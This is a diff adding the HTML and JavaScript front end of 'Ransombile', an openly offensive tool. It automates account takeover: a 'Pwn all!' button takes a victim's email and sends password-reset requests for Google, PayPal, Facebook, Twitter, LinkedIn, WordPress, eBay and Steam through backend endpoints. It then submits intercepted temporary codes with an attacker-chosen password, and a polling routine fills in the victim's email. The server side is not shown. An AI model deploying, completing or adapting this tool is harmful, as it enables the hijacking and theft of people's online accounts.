@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta name="author" content="Martin Vigo">
+		<title>Ransombile</title>
+	</head>
+
+
+	<body>
+		<div id="mainDiv">
+			<span id="title">Ransombile</span>
+
+			<div id="border">
+				<div id="passwordInput">
+					<span id="passwordLabel" class="label">Password:</span>
+					<input type="textbox" id="password" value="Rand0mPassw0rd!" onclick="this.value='';validateEmailAndPassword()" onkeyup="validateEmailAndPassword()"/>
+				</div>
+
+				<div id="emailLabels">
+					<span id="emailLabel" class="label">Email:</span>
+					<span id="emailVictimLabel" onclick="document.getElementById('email').value = this.innerText;validateEmailAndPassword()"></span>
+				</div>
+				<input type="textbox" id="email" placeholder="victim@pwnme.com" onkeyup="validateEmailAndPassword()" value=""/>
+				<button id="emailButton" onclick="initiatePasswordReset()" /> Pwn all!</button>
+			</div>
+
+			
+			<div class="labelAndStatus">
+				<span id="googleLabel" class="label">Google:</span>
+				<span id="googleStatusLabel" class="statusLabel" hidden></span>
+			</div>
+			<div class="inputAndButton">
+				<input type="textbox" id="googleTextbox"/> 
+				<button id="googleButton" onclick="resetPassword('google')" disabled>Reset</button>
+			</div>
+
+			<div class="labelAndStatus">
+				<span id="paypalLabel" class="label">Paypal:</span>
+				<span id="paypalStatusLabel" class="statusLabel" hidden></span>
+			</div>
+			<div class="inputAndButton">
+				<input type="textbox" id="paypalTextbox"/> 
+				<button id="paypalButton" onclick="resetPassword('paypal')" disabled>Reset</button>
+			</div>
+
+			<div class="labelAndStatus">
+				<span id="facebookLabel" class="label">Facebook:</span>
+				<span id="facebookStatusLabel" class="statusLabel" hidden></span>
+			</div>
+			<div class="inputAndButton">
+				<input type="textbox" id="facebookTextbox"/> 
+				<button id="facebookButton" onclick="resetPassword('facebook')" disabled>Reset</button>
+			</div>
+
+			<div class="labelAndStatus">
+				<span id="twitterLabel" class="label">Twitter:</span>
+				<span id="twitterStatusLabel" class="statusLabel" hidden ></span>
+			</div>
+			<div class="inputAndButton">
+				<input type="textbox" id="twitterTextbox"/> 
+				<button id="twitterButton" onclick="resetPassword('twitter')" disabled>Reset</button>
+			</div>
+
+			<div class="labelAndStatus">
+				<span id="linkedinLabel" class="label">LinkedIn:</span>
+				<span id="linkedinStatusLabel" class="statusLabel" hidden></span>
+			</div>
+			<div class="inputAndButton">
+				<input type="textbox" id="linkedinTextbox"/> 
+				<button id="linkedinButton" onclick="resetPassword('linkedin')" disabled>Reset</button>
+			</div>
+
+			<div class="labelAndStatus">
+				<span id="wordpressLabel" class="label">Wordpress:</span>
+				<span id="wordpressStatusLabel" class="statusLabel" hidden></span>
+			</div>
+			<div class="inputAndButton">
+				<input type="textbox" id="wordpressTextbox"/> 
+				<button id="wordpressButton" onclick="resetPassword('wordpress')" disabled>Reset</button>
+			</div>
+
+			<div class="labelAndStatus">
+				<span id="ebayLabel" class="label">Ebay:</span>
+				<span id="ebayStatusLabel" class="statusLabel" hidden ></span>
+			</div>
+			<div class="inputAndButton">
+				<input type="textbox" id="ebayTextbox"/> 
+				<button id="ebayButton" onclick="resetPassword('ebay')" disabled>Reset</button>
+			</div>
+		</div>
+		
+
+
+		<script>
+			var set_delay = 5000;
+			var xhttp = new XMLHttpRequest();
+			var callout = function () {
+				xhttp.onreadystatechange = function() {
+				  		if(xhttp.readyState === XMLHttpRequest.DONE){
+					    	var response = JSON.parse(this.responseText);
+					    	if (this.status == 200 && document.getElementById("emailVictimLabel").innerText != response.email) {
+					    		document.getElementById("emailVictimLabel").innerText = response.email;
+					    	}
+					    setTimeout(callout, set_delay);
+					    }
+				  	};
+				xhttp.open("GET", "/ransombile/checkMail", true);
+				xhttp.send();
+			}
+			callout();
+
+
+
+
+			function initiatePasswordReset() {
+				initiatePasswordResetFor("google");
+				initiatePasswordResetFor("paypal");
+				initiatePasswordResetFor("facebook");
+				initiatePasswordResetFor("twitter");
+				initiatePasswordResetFor("linkedin");
+				initiatePasswordResetFor("wordpress");
+				initiatePasswordResetFor("ebay");
+				initiatePasswordResetFor("steam");
+			}
+
+			function initiatePasswordResetFor(website) {
+				var xhttp = new XMLHttpRequest();
+
+				var statusLabels = document.getElementsByClassName("statusLabel");
+				for(var i=0;i<statusLabels.length;i++){
+					statusLabels[i].innerHTML='Initiating password reset...';
+					statusLabels[i].removeAttribute('hidden');
+				}
+
+			  	xhttp.onreadystatechange = function() {
+			  		if(xhttp.readyState === XMLHttpRequest.DONE){
+				    	var response = JSON.parse(this.responseText);
+				    	document.getElementById(website + "StatusLabel").innerHTML = response.status;
+
+				    	if (this.status == 200) {
+				    		document.getElementById(website + "Button").style.color = "green";
+	    					document.getElementById(website + "Button").style.border = "5px solid green";
+	    					document.getElementById(website + "Textbox").placeholder = "Enter the temp code";
+	    					document.getElementById(website + "Button").disabled = false;
+				    	}
+				    	else{
+				    		document.getElementById(website + "Label").style.color = "red";
+				    		document.getElementById(website + "Button").disabled = true;
+				    	}
+				    }
+			  	};
+
+				xhttp.open("GET", "/" + website + "/initiate?email=" + document.getElementById("email").value, true);
+				xhttp.send();
+			}
+
+
+
+			function resetPassword(website) {
+				var xhttp = new XMLHttpRequest();
+
+				document.getElementById(website+"StatusLabel").innerHTML="Resetting password...";
+
+			  	xhttp.onreadystatechange = function() {
+			  		if(xhttp.readyState === XMLHttpRequest.DONE){
+				    	var response = JSON.parse(this.responseText);
+				    	document.getElementById(website+"StatusLabel").innerHTML=response.status;
+
+				    	var color = "red";
+				    	if (this.status == 200) {
+		    				color = "green";
+		    			}
+		    			document.getElementById(website + "Label").style.color = color;
+		    		}
+				};
+
+			  	xhttp.open("GET", "/" + website + "/finish?temp_code=" + document.getElementById(website + "Textbox").value + "&password=" + document.getElementById("password").value, true);
+				xhttp.send();
+			}
+
+
+			function validateEmailAndPassword(){
+				var regex = /^\S+@\S+\.\S+$/;
+				
+				var color = "red";
+    			if(regex.test(document.getElementById('email').value) && document.getElementById('password').value != ""){
+    				color = "green";
+    				document.getElementById("emailButton").disabled = false;
+    			}
+    			document.getElementById("emailButton").style.color = color;
+    			document.getElementById("emailButton").style.border = "5px solid " + color;
+
+			}
+
+			function propagateEmail(email){
+				document.getElementById('email').value = email;
+				if(document.getElementById('password').value == ""){
+					document.getElementById('password').value = document.getElementById('password').placeholder;
+				}
+				validateEmailAndPassword(email);
+			}
+
+			function propagatePhone(phone){
+				document.getElementById('phone').value = phone;
+				if(document.getElementById('password').value == ""){
+					document.getElementById('password').value = document.getElementById('password').placeholder;
+				}
+				validateEmailAndPassword(email);
+			}
+		</script>
+	</body>
+</html>
